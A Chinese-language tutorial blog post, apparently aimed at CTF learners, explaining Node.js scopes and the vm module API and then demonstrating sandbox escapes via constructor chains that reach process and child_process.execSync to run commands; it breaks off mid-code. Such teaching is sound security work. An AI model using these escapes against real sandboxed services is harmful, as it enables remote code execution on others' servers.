---
title: 从0开始的Node.js-vm/vm2沙箱逃逸
url: https://mp.weixin.qq.com/s/6WR0xj8l1tYrgm8Uyu9wtg
source: Doonsec's feed
date: 2026-04-25
fetch_date: 2026-04-26T04:59:56.547930
---

# 从0开始的Node.js-vm/vm2沙箱逃逸

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/L5p13fmOxK2GicgoDEEfDMctwSiamWkYmJLNeEf5xDMnibFmJFKuWHVTBJRHicLXavQmnsb83vEukUWsTDMwIQe7s0peVvep24qSUKsmyQde9Ac/0?wx_fmt=jpeg)

# 从0开始的Node.js-vm/vm2沙箱逃逸

原创

G3ng4r
G3ng4r

Zer0day安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# 0x01 沙箱逃逸初识

在学习沙箱逃逸之前，需要先明确的一些基本概念

## JavaScript 和 Node.js 的区别

两者的主要区别在于这两种技术在 Web 应用程序开发中的应用方式，JavaScript 基本上是一种编程或脚本语言，可以在任何安装了 JavaScript 引擎的浏览器中运行，而 Node.js 是一个跨平台、后端、开源的 JavaScript 运行时环境，构建在 Chrome 的 V8 JavaScript 引擎之上，并在 Web 浏览器之外执行 JS 代码。简单来说：Node.js 是一个让 JavaScript 能够在服务端运行的环境

## 沙箱（sandbox）的基本概念

沙箱机制，或称沙盒技术，是一种安全技术，用于隔离运行中的程序，以防止程序对计算机系统造成未授权的更改或破坏。沙箱为程序提供了一个受限的执行环境，程序在这个环境中运行，就像孩子在沙盒中玩耍一样，可以自由活动，但不会影响到沙盒外的世界。让用户提交 JS 代码并在服务器上执行，是一些 OJ、量化网站重要的服务，也是 CTF 的考察重点。为了不让恶意用户执行任意的 JS 代码，就需要确保其运行在沙箱中

## 沙箱，虚拟机和容器之间的区别

沙箱（sandbox）是应用/进程级别的安全隔离机制，核心是权限限制 + 环境隔离，把程序关在一个可控区域里，禁止访问外部系统、文件、硬件，防止风险扩散

虚拟机（VM）是硬件层面的虚拟化， 模拟出一整套 CPU、内存、磁盘、网卡等硬件，每台虚拟机都有独立的操作系统和内核，和宿主机、其他虚拟机完全隔绝

容器（Docker）是操作系统层面的虚拟化。 它共用宿主机内核，通过资源隔离和资源限制，只封装应用和依赖，不虚拟硬件

总结：沙箱、虚拟机和容器的核心区别在于隔离层级和实现机制：沙箱是一种安全隔离机制，虚拟机提供硬件级隔离，而 Docker 容器提供操作系统级隔离

## Node.js 的沙箱创建

Node.js 中创建沙箱主要有三种方式：使用内置 vm 模块、使用 vm2 增强库以及采用进程隔离方案，其中 vm2 是当前最推荐的安全选择，内置 vm 模块因安全风险不建议用于生产环境

# 0x02 Node.js 的作用域

在 Node.js 的编程环境中，每个 JavaScript 文件都被视为一个独立的模块，它们各自拥有自己的私有作用域（或称为上下文）。这意味着，一个模块内部定义的变量、函数等默认情况下是无法被其他模块直接访问的。这种设计保证了模块之间的独立性和封装性，避免了全局命名空间的污染

## 模块作用域（Module Scope）

每个 Node.js 文件都被视为一个独立的模块。这些模块拥有它们自己的作用域，也就是说，一个模块中的变量、函数等默认不会影响到其他模块。这种设计使得模块之间天然隔离，减少了相互之间的干扰。

```
//test1.js
let name = 'Zer0day'

//test2.js
const whoami = require('./test1.js')
console.log(whoami.name) //输出undefined
```

`require` 只返回一个模块的导出对象，但是此时输出为 `undefined`，说明此时 test2.js 并没有导入 test1.js 的变量，需要使用元素输出的接口 `exports`

```
//test1.js
let name = 'Zer0day'
exports.name = name //使用exports接口导出变量name

//test2.js
const whoami = require('./test1.js')
console.log(whoami.name) //输出Zer0day
```

两包关系如图所示，接下来讲讲图中的 `global` 是什么

![](https://mmbiz.qpic.cn/mmbiz_png/L5p13fmOxK0ZSVwNQKibhuO8uFN909PHibnYOWfWDXibFcoqia9AIlXwuJqorqGA6KsxpJRW7RXOFXLmGrVYvAogvrFwdGQgKDibK23Kw9UC2NlA/640?wx_fmt=png&from=appmsg)

## 全局作用域（Global Scope）

在 Node.js 中，`global` 对象是一个全局对象，它的属性和方法在所有模块中都是可访问的。这包括了如 `console`、`process`、`Buffer` 等内置对象，以及任何直接添加到 `global` 对象上的自定义属性或方法。

```
//test1.js
global.name = 'Zer0day'

//test2.js
require('./test1.js')
console.log(name)
```

通过上面的例子可以看到，在输出 `name` 时，即使 test2.js 中没有定义 name 变量也可以直接使用 `name` 进行输出，test1.js 中的 `name` 也不需要使用 `exports` 进行导出，因为此时 name 已经挂载在 `global` 上了

但是，通常不推荐在全局作用域中添加大量自定义变量或函数，因为这可能会导致命名冲突和难以追踪的错误。

# 0x03 vm 模块 API

前面已经介绍了 Node.js 的作用域，设想如果创建一个新的作用域，让代码在这个新的作用域里面去运行，就能与其他作用域进行隔离，事实上这就是 vm 模块运行的原理，首先介绍 vm 模块常用 API

## vm.runinThisContext(code)

在当前 global（全局上下文）下创建一个作用域，并将接收到的参数当作代码运行。sandbox 中可以访问到 global 中的属性，但无法访问其他包中的属性

![](https://mmbiz.qpic.cn/mmbiz_png/L5p13fmOxK0rWLO2mkkxlceg0U0YmIr0VZ0XNHoKrZkWnctF9u5U7oMBQeiaicy3vt3nBPFKPVZibpS35hhvQnLma7aJSoVyL7UCG4D6Fxd4ek/640?wx_fmt=png&from=appmsg)

```
const vm = require('vm')
let localName = 'Zer0day'
const sandboxName = vm.runInThisContext('name = "G3ng4r"')
console.log(sandboxName) //G3ng4r
console.log(localName)   //Zer0day(当前模块作用域的localName并没有被vm影响）
```

注意：在 JavaScript 中，赋值操作符不仅会把右边的值赋给左边，它还会返回这个被赋的值，例子中 `rename` 的值实际上是 vm 的运行结果返回

## vm.createContext([sandbox])

传入的 sandbox 对象被绑定到 V8 的新 context，在当前 global 对象之外创建一个全新的作用域，沙箱内运行的代码会将 sandbox 的属性视为全局变量，除非显式传入否则沙箱内无法直接访问 Node.js 的全局对象。配合下面的 `vm.runInContext()` 使用

## vm.runInContext(code, contextifiedSandbox[, options])

参数为要执行的代码和创建完作用域的沙箱对象，将对象"上下文化"，使其成为独立执行环境的全局对象，在指定沙箱环境中编译并执行 JavaScript 代码，并且参数的值与沙箱内的参数值相同

![](https://mmbiz.qpic.cn/sz_mmbiz_png/L5p13fmOxK1bowFlWh6ApD9LIXibOHxYuuX7XemLLFbIWKSoiaUKZ7xRnemlWB2UH36B8tdy3hUGrMN0fLCO6Lcicp6lOqyvvfNKfUib1d4bwcI/640?wx_fmt=png&from=appmsg)

```
const util = require('util')
const vm = require('vm')
global.globalVar = 333
const sandbox = { globalVar : 111 }
vm.createContext(sandbox)
vm.runInContext('globalVar *= 2',sandbox)
console.log(util.inspect(globalVar))         //333
console.log(util.inspect(sandbox.globalVar)) //222
```

## vm.runInNewContext(code,[, sandbox][, options])

`creatContext` 和 `runInContext` 的结合版，传入要执行的代码和沙箱对象

```
const util = require('util')
const vm = require('vm')
global.globalVar = 333
const sandbox = { globalVar : 111 }
vm.runInNewContext('globalVar *= 2',sandbox)
console.log(util.inspect(globalVar))         //333
console.log(util.inspect(sandbox.globalVar)) //222
```

## vm.Script 类

Node.js 内置 vm 模块提供的类，用于编译但不执行 JavaScript 代码，编译后的脚本可以被多次执行，并且允许自定义全局对象和执行环境

`new vm.Script(code, options)`：code 是不绑定于任何全局对象的，它仅仅绑定于每次执行它的对象

`script.runInContext([contextifiedSandbox[, options]])`: 在指定的上下文中执行预编译的脚本

`script.runInNewContext([sandbox[, options]])`: 创建一个新的上下文并在其中执行脚本

```
const util = require('util')
const vm = require('vm')
const sandbox = {
    school : 'tjut',
    grade : 1,
    team : 'Zer0day'
}
const script = new vm.Script('school = "TUT";grade += 1;student = "G3ng4r"')
//将sandbox的引用传入V8上下文
const context = vm.createContext(sandbox)
//执行预编译脚本
script.runInContext(context)
console.log(util.inspect(sandbox)) //{ school: 'TUT', grade: 2, team: 'Zer0day', student: 'G3ng4r' }
```

# 0x04 vm 沙箱逃逸

一般进行沙箱逃逸最后的目的都是进行 rce，在 Node 中进行 rce 就需要获取 `process` 对象，用 require 来导入 `child_process`，再利用 `child_process` 执行命令，这就是 Node 中最常规的 rce 过程

但 `process` 挂载在 `global` 上，而在 `creatContext` 后是不能访问到 global 的，所以我们最终的目标是通过各种办法将 global 上的 process 引入到沙箱中：

## .constructor.constructor / .toString.constructor

```
const vm = require("vm")
const demo = vm.runInNewContext(`this.constructor.constructor('return process.env')()`)
console.log(demo)
```

成功输出了 env 内容，为什么能在 `vm.runInNewContext` 中拿到 `process` 呢，`this` 指向的是 this 指向的是当前传递给 `runInNewContext` 的对象，该对象不属于沙箱环境内部，利用 `.constructor` 获取该对象的构造器 Function，再利用 `.constructor` 获取 Function 的构造器，由这层继承关系 `Function.constructor` 位于 global 中，利用其构造返回 process 的函数，最后通过 `()` 调用获取 `process` 对象

类似的，`this.toString.constructor` 也能获取到 `Function.constructor` 完成获取目的，完成 rce：

```
const vm = require("vm")
const proc = vm.runInNewContext(`this.toString.constructor('return process')()`)
console.log(proc.mainModule.require('child_process').execSync('whoami').toString())
```

除了 this 还有什么能在沙箱中通过继承关系逃逸出来呢？可以尝试利用沙箱中的变量吗

```
const inspect = require('util').inspect;
const vm = require('vm');
const script = new vm.Script(`
(Zer0day => {
    const demmo = a.toString.constructor('return process')()
    return demo.mainModule.require('child_process').execSync('whoami').toString()
})()
`);
const sandbox = {a: 114, b : '514', c : true};
const context = new vm.createContext(sandbox);
const res = script.runInContext(context);
console.log(res);
```

以上三个变量都逃逸失败"ReferenceError: process is not defined"，因为数字，字符串，布尔（包括）这些都是 primitive 类型（原始类型，也称基本数据类型），在传递的过程中是将值传递过去而不是引用（类似于函数传递形参），因此沙盒内使用的 a，b，c 只是它们的值而不是其本身，相当于在沙箱中直接声明，这是没有办法利用的

```
const inspect = require('util').inspect;
const vm = require('vm');
const script = new vm.Script(`
(zer0day => {
    // const demmo = a.toString.constructor('return process')()
    // const demmo = b.toString.constructor('return process')()
    const demo = c.toString.constructor('return process')()
    return demo.mainModule.require('child_process').execSync('whoami').toString()
})()
`);
const sandbox = {a: 114, b : '514', c : true};
const context = new vm.createContext(sandbox);
const res = script.runInContext(context);
console.log(res);
```

但是可以将其设为 `[]` , `{}` 这样的对象实例类型，内置构造/自定义函数

```
const inspect = require('util').inspect;
const vm = require('vm');
const script = new vm.Script(`
(Zer0day => {
    const demo = c.constructor.constructor('return process')()
    return demo.mainModule.require('child_process').execSync('whoami').toString()
})()
`);
const sandbox = {a: [], b : {}, c : /cillo/};
//实例对象: {} [] /regex/
//内置构造函数: String Number Symbol BigInt Array Object Function RegExp Data Error TypeError SyntaxError Map Set WeakMap WeakSet ArrayBuffer DataView
//自定义函数: ()=>{}  function(){}
const context = new vm.createContext(sandbox);
const res = script.runInContext(context);
c...